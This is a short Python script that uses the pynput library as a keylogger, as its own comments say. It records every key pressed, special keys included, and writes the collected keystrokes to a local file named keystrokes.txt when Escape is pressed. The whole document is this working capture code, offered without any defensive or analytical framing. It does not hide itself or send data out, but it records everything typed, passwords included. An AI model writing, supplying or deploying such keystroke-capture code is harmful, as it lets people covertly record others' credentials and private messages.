from pynput.keyboard import Key, Listener

keystrokes = []

# Callback function to record keystrokes
def on_press(key):
    try:
        keystrokes.append(key.char)  # Only record alphanumeric characters
    except AttributeError:
        keystrokes.append(str(key))  # Special keys (e.g., Enter, Shift, etc.)

# Save keystrokes to a file
def on_release(key):
    if key == Key.esc:  # Stop the keylogger when the escape key is pressed
        with open("keystrokes.txt", "w") as f:
            f.write(''.join(keystrokes))
        return False

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
